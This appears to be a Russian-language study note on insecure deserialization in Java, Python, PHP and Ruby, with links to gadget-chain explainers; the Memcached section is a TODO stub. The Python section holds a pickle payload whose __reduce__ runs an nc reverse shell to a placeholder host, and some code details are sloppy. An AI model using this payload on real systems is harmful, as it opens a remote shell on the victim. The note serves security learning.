Для чего используется сериализация / десериализация? [Source](https://www.slideshare.net/slideshow/appseccali-2015-marshalling-pickles/44009258)  
- Удаленный / локальный обмен данными между разными системами и процессами;
- Передача данных по сети, обмен данными между веб сервисами, message brokers;
- Хранения данных в БД, кеше, файловой системе;
- Использование как токена (cookie, HTTP headers, etc.);

**Форматы сериализации**:  
- Java serialization
- JSON
- XML
- YAML
- protobuf
- MessagePack

**Gadget**: фрагмент существующего кода в приложении, который при десериализации может быть использован для построения цепочки команд, например объект класса.  

**Gadget chain объяснение**:  
- https://medium.com/@dub-flow/deserialization-what-the-heck-actually-is-a-gadget-chain-1ea35e32df69  
- https://pentesterlab.com/glossary/gadget-chain

**Дополнительная информация**: https://pentesterlab.com/glossary/insecure-deserialization  

## Java:  
Для сериализации/десериализации в Java используется интерфейс класса Java.io.Serializable. Для сериализации объекта в байты используется класс ObjectOutputStream, метод writeObject() выполняет запись байт в поток. Для десериализации используется класс 
ObjectInputStream, метод readObject() используется для чтения потока байт из потока (чтение объекта из ObjectOutputStream), readResolve().  

Сериализованные объект может храниться в разных видах хранилищ.  

Для десериализации данных класс должен наследовать интерфейс Serializable.  

Признаки сериализованного объекта:  
```
ac ed 00 05 73 72
rO0AB
```  
Эксплуатация десериализации в Java зависит от потока выполнения кода.  

**Java reflection**: https://javarush.com/groups/posts/513-reflection-api-refleksija-temnaja-storona-java  
Простыми словами у Java есть возможность чтения и модификации переменных и функций классов помеченных модификаторами private и protected. Возможность изучения классов в runtime.  

**Jackson библиотека**:  
Блиблиотека, которая используется для конвертиции строк JSON и простых объектов. Также поддерживает другие форматы данных, такие как CSV, YAML, XML. Библиотека имеет три основных пакета: 
 - **Streaming**: читает и записывает содержимое JSON в виде дискретных событий.
 - **JsonParser** считывает JSON в объект.
 - **JsonGenerator** записывает объект в JSON.  
 - Databind, 
 - Annotations.  

ObjectMapper: модель дерева создает в памяти древовидное представление документа JSON. Отвечает за построение дерева и узлов JsonNode. ObkectMapper является наиболее часто используемой частью библиотеки Jackson, так как является самым простым способом 
преобразования между объектом и JSON. Она находится в com.fasterxml.jackson.databind.  

Методы ObjectMapper:  
- readValue(): используется для десериализации (преобразования JSON строки, потока или файла в объект);
- writeValue(): используется для сериализации (преобразования объекта в JSON):

**Аннотации Jackson**: [https://github.com/FasterXML/jackson-annotations/wiki/Jackson-Annotations](https://github.com/FasterXML/jackson-annotations/wiki/Jackson-Annotations)

## Python:  
Для сериализации и десериализации объектов в Python используются несколько модулей: pickle, cloudpickle, dill.  

**Методы сериализации / десериализации**:  
- dump: записать сериализованный объект в открытый файл.
- load: преобразует поток байт в объект.
- dumps: возвращает сериализованный объект как строку.
- loads: вернуть результат десериализации как строку.

**Pickle payload**:  
```
import pickle
import os

class pwn(object):
  def __reduce__(self):
    comm = "nc <IP>:<PORT> -e /bin/bash "
    return (os.system, (comm,)) // returns as string or tuple this object on deserialization process.
pwn = pickle.dumps(pwn())
```  
Эксплуатация дусериализации в Python не зависит от потока выполнения кода.  

## PHP:  
Эксплуатация десериализации в PHP зависит от выполнения кода внутри "магических методах".  

**Магические методы используемые в PHP**:  
- __sleep(): вызывается при сериализации и должен вернуть мессив.
- __wakeup(): вызывается во время десериализации объекта.
- __destruct(): вызывается при завершении скрипта PHP и когда объект уничтожается.
- __toString(): использовать объект как строку, также может использоваться для чтения файлов или других действий в зависимости от вызываемых внутри метода функций.

**PHP insecure deserialization gadget chain**: https://blog.redteam-pentesting.de/2021/deserialization-gadget-chain/  

## Ruby:  

Методы сериализации / десериализации:  
- Marshall.dump: конвертирует объект в поток байт.
- Marshall.load: конвертирует поток байт в объект.


## Memchaced:  
// TODO;  

